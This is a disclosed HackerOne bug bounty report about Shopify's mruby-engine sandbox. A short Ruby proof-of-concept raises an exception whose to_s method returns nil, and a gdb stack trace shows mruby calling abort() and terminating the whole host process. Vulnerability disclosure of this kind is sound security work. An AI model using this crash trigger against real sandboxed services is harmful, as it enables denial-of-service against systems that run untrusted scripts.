# Exception cause SIGABRT

## Report Details
- **Report ID**: 180977
- **URL**: https://hackerone.com/reports/180977
- **State**: Closed
- **Severity**: high
- **Submitted**: 2016-11-08T20:17:22.613Z
- **Disclosed**: 2016-12-16T20:05:23.592Z

## Reporter
- **Username**: isra17
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
Overriding the `to_s` method of an exception and raise it from a sandboxed mruby evaluation result in a `abort()` call from `mruby`. This results with the whole ruby process terminating.

Tested on [4cd4dfc855f0cce18b1ee2f318927c13edb20d14](https://github.com/Shopify/mruby-engine/tree/4cd4dfc855f0cce18b1ee2f318927c13edb20d14)

# POC

```
# poc.rb
class A < Exception
  def to_s
  end
end
raise A.new
```

`$ bin/sandbox poc.rb`

# Crash Stacktrace:
```
 Thread 1 (Thread 0x7fe2b0992700 (LWP 26764)):
 #0  0x00007fe2aff8e428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
         resultvar = 0
         pid = 26764
         selftid = 26764
 #1  0x00007fe2aff9002a in __GI_abort () at abort.c:89
         save_stage = 2
         act = {__sigaction_handler = {sa_handler = 0x7fe2aadaf4e0, sa_sigaction = 0x7fe2aadaf4e0}, sa_mask = {__val = {140611505812704, 0, 140611505991664, 0, 140611527335906, 140611505812704, 140611527442253, 0, 0, 140611505812704, 140611505843808, 0, 0, 140611505812704, 140611505888960, 0}}, sa_flags = 0, sa_restorer = 0x7fe2aadb6e60}
         sigs = {__val = {32, 0 <repeats 15 times>}}
 #2  0x00007fe2ac234bbc in mrb_exc_raise (mrb=mrb@entry=0x7fe2aadaf4e0, exc=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:295
 No locals.
 #3  0x00007fe2ac234f66 in mrb_raisef (mrb=mrb@entry=0x7fe2aadaf4e0, c=0x7fe2aadb6920, fmt=fmt@entry=0x7fe2ac2a3888 "%S cannot be converted to %S by #%S") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:371
         args = <error reading variable args (Attempt to dereference a generic pointer.)>
         mesg = <optimized out>
 #4  0x00007fe2ac24c784 in mrb_convert_type (mrb=mrb@entry=0x7fe2aadaf4e0, val=val@entry=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x7fe2ac2a23d9 "String", method=method@entry=0x7fe2ac29fdba "to_s") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/object.c:340
         v = <optimized out>
 #5  0x00007fe2ac23a3ae in mrb_str_to_str (mrb=mrb@entry=0x7fe2aadaf4e0, str=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:1016
         s = <optimized out>
 #6  0x00007fe2ac23d338 in mrb_string_value_cstr (mrb=0x7fe2aadaf4e0, ptr=ptr@entry=0x7ffefeff51e0) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:2222
         str = <optimized out>
         ps = <optimized out>
         len = <optimized out>
         p = <optimized out>
 #7  0x00007fe2ac21e4ba in me_mruby_engine_get_exception (self=self@entry=0x7fe2aadaf3e0) at ../../../../ext/mruby_engine/mruby_engine.c:106
         host_backtrace = 22683040
         backtrace = {value = {p = 0x7fe2aadb7370, {i_flag = 0, i = 70305752922552}, {sym_flag = 112, sym = 32738}, bp = 0x7fe2aadb7370, fp = 0x7fe2aadb7370, vp = 0x7fe2aadb7370}, w = 140611505845104}
         class_name_obj = {value = {p = 0x7fe2aadb7280, {i_flag = 0, i = 70305752922432}, {sym_flag = 128, sym = 32738}, bp = 0x7fe2aadb7280, fp = 0x7fe2aadb7280, vp = 0x7fe2aadb7280}, w = 140611505844864}
         class_name = 0x7fe2aadb7280
         message = {value = {p = 0x7fe2aadb7430, {i_flag = 0, i = 70305752922648}, {sym_flag = 48, sym = 32738}, bp = 0x7fe2aadb7430, fp = 0x7fe2aadb7430, vp = 0x7fe2aadb7430}, w = 140611505845296}
         err = <optimized out>
 #8  0x00007fe2ac21c04c in me_mruby_engine_eval (self=self@entry=0x7fe2aadaf3e0, proc=<optimized out>, err=err@entry=0x7ffefeff53d0) at ../../../../ext/mruby_engine/eval_monitored.c:227
         err_no = <optimized out>
         thread = 140611505809152
         ru_then = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27092, __ru_maxrss_word = 27092}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4523, __ru_minflt_word = 4523}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 10, __ru_nvcsw_word = 10}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}
         ru_now = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27160, __ru_maxrss_word = 27160}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4525, __ru_minflt_word = 4525}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 11, __ru_nvcsw_word = 11}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}
         bypass_ctx = <optimized out>
         cid = -214394
         wait_result = <optimized out>
 #9  0x00007fe2ac21cc61 in ext_mruby_engine_eval (rself=22683280, rpath=22683200, rsource=22683080) at ../../../../ext/mruby_engine/ext.c:199
         err = 8
         proc = <optimized out>
 #10 0x00007fe2b049a50b in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #11 0x00007fe2b04a84a3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #12 0x00007fe2b04a94d3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #13 0x00007fe2b049e269 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #14 0x00007fe2b04a3142 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #15 0x00007fe2b0389cfd in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #16 0x00007fe2b038b6fd in ruby_exec_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #17 0x00007fe2b038d83e in ruby_run_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3
 No symbol table info available.
 #18 0x000000000040087b in ?? ()
 No symbol table info available.
 #19 0x00007fe2aff79830 in __libc_start_main (main=0x400830, argc=3, argv=0x7ffefeff5e38, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffefeff5e28) at ../csu/libc-start.c:291
         result = <optimized out>
         unwind_buf = {cancel_jmp_buf = {{jmp_buf = {0, -1400422201668288379, 4196480, 140733176569392, 0, 0, 1399860906120036485, 1393279154571296901}, mask_was_saved = 0}}, priv = {pad = {0x0, 0x0, 0x7ffefeff5e58, 0x7fe2b09c7168}, data = {prev = 0x0, cleanup = 0x0, canceltype = -16818600}}}
         not_first_call = <optimized out>
 #20 0x00000000004008a9 in _start ()
 No symbol table info available.
Title: ruby2.3 crashed with SIGABRT in mrb_exc_raise()
```

Cheers!

## Attachments
No attachments
